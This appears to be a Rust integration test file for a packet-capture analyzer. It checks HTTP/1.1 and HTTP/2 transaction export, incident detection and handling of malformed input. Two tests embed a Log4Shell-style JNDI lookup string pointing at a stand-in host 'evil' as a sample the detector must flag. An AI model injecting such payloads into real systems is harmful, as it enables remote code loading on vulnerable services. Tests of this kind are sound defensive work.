#[path = "support/http2.rs"]
mod http2;
#[path = "support/http.rs"]
mod support;

use packrat_tui::{export::pcapng::PcapNgWriter, net::packet::CaptureMetadata};
use serde_json::Value;
use std::{
    path::Path,
    process::{Command, Output},
};

fn run(path: &Path) -> Output {
    Command::new(env!("CARGO_BIN_EXE_packrat-analyze"))
        .arg(path)
        .env_remove("TERM")
        .env("HOME", "/nonexistent")
        .output()
        .unwrap()
}

fn events(output: &Output) -> Vec<Value> {
    assert!(
        output.status.success(),
        "{}",
        String::from_utf8_lossy(&output.stderr)
    );
    String::from_utf8(output.stdout.clone())
        .unwrap()
        .lines()
        .map(|line| serde_json::from_str(line).unwrap())
        .collect()
}

#[test]
fn capture_to_transactions_runs_without_a_terminal_or_user_config() {
    let directory = tempfile::tempdir().unwrap();
    let path = directory.path().join("exchange.pcapng");
    let mut writer = PcapNgWriter::create(&path).unwrap();
    writer
        .write_packet(&support::tcp(1, 100, 0x02, &[], false))
        .unwrap();
    writer
        .write_packet(&support::tcp(
            2,
            101,
            0x18,
            b"GET /headless HTTP/1.1\r\nHost: example\r\n\r\n",
            false,
        ))
        .unwrap();
    writer
        .write_packet(&support::tcp(
            3,
            500,
            0x18,
            b"HTTP/1.1 200 OK\r\nContent-Length: 2\r\n\r\nok",
            true,
        ))
        .unwrap();
    writer.flush().unwrap();
    let events = events(&run(&path));
    let conversation = events
        .iter()
        .find(|value| value["type"] == "http_conversation")
        .unwrap();
    let transaction = &conversation["conversation"]["transactions"][0];
    assert_eq!(transaction["request"]["target"], "/headless");
    assert_eq!(
        transaction["request"]["packet_numbers"],
        serde_json::json!([2])
    );
    assert_eq!(transaction["response"]["status"], 200);
    let summary = events.last().unwrap();
    assert_eq!(summary["type"], "summary");
    assert_eq!(summary["packets"], 3);
    assert_eq!(summary["analyzed"], 3);
    assert_eq!(summary["http_exchanges"], 1);
    assert_eq!(summary["containment"], "disabled");
    assert_eq!(summary["transaction_scope"], "retained_streams_only");
}

#[test]
fn cleartext_http2_capture_is_exported_as_multiplexed_exchanges() {
    let directory = tempfile::tempdir().unwrap();
    let path = directory.path().join("http2.pcapng");
    let stream = http2::stream(
        &http2::frame(1, 5, 1, &http2::request(b"/h2")),
        &http2::frame(1, 5, 1, &[0x88]),
    );
    let mut writer = PcapNgWriter::create(&path).unwrap();
    writer
        .write_packet(&support::tcp(1, 100, 0x18, &stream.client_data, false))
        .unwrap();
    writer
        .write_packet(&support::tcp(2, 500, 0x18, &stream.server_data, true))
        .unwrap();
    writer.flush().unwrap();
    let events = events(&run(&path));
    let event = events
        .iter()
        .find(|event| event["type"] == "http2_conversation")
        .unwrap();
    let transaction = &event["conversation"]["transactions"][0];
    assert_eq!(transaction["stream_id"], 1);
    assert_eq!(transaction["response"]["state"], "Complete");
    assert_eq!(
        transaction["request"]["packet_numbers"],
        serde_json::json!([1])
    );
    assert_eq!(events.last().unwrap()["http2_exchanges"], 1);
}

#[test]
fn critical_detection_is_reported_without_enforcement() {
    let directory = tempfile::tempdir().unwrap();
    let path = directory.path().join("incident.pcapng");
    let mut writer = PcapNgWriter::create(&path).unwrap();
    writer
        .write_packet(&support::tcp(1, 100, 0x18, b"${jndi:ldap://evil/x}", false))
        .unwrap();
    writer.flush().unwrap();
    let events = events(&run(&path));
    assert!(events.iter().any(|value| value["type"] == "incident"));
    assert!(events.last().unwrap()["incidents"].as_u64().unwrap() > 0);
    assert_eq!(events.last().unwrap()["containment"], "disabled");
}

#[test]
fn unsupported_link_types_are_reported_not_silently_analyzed() {
    let directory = tempfile::tempdir().unwrap();
    let path = directory.path().join("unsupported.pcapng");
    let mut packet = support::tcp(1, 100, 0x18, b"${jndi:ldap://evil/x}", false);
    packet.capture = Some(CaptureMetadata {
        timestamp: Some(packrat_tui::net::packet::CaptureTimestamp {
            ticks: 1,
            resolution: packrat_tui::net::packet::TimestampResolution::Decimal(0),
            offset_seconds: 0,
        }),
        captured_length: packet.bytes.len() as u32,
        wire_length: packet.bytes.len() as u32,
        link_type: 101,
        interface_id: 0,
        section_id: 0,
        interface_name: None,
        comments: vec![],
    });
    let mut writer = PcapNgWriter::create(&path).unwrap();
    writer.write_packet(&packet).unwrap();
    writer.flush().unwrap();
    let events = events(&run(&path));
    assert_eq!(events[0]["type"], "skipped_packet");
    assert_eq!(events[0]["reason"]["UnsupportedLinkType"], 101);
    assert_eq!(events.last().unwrap()["skipped"], 1);
    assert_eq!(events.last().unwrap()["incidents"], 0);
}

#[test]
fn malformed_capture_and_extra_arguments_fail_without_a_success_summary() {
    let file = tempfile::NamedTempFile::new().unwrap();
    std::fs::write(file.path(), b"not a pcap file").unwrap();
    let output = run(file.path());
    assert!(!output.status.success());
    assert!(!String::from_utf8_lossy(&output.stdout).contains("summary"));
    let output = Command::new(env!("CARGO_BIN_EXE_packrat-analyze"))
        .args(["x", "--contain"])
        .output()
        .unwrap();
    assert!(!output.status.success());
    assert!(String::from_utf8_lossy(&output.stderr).contains("exactly one"));
}
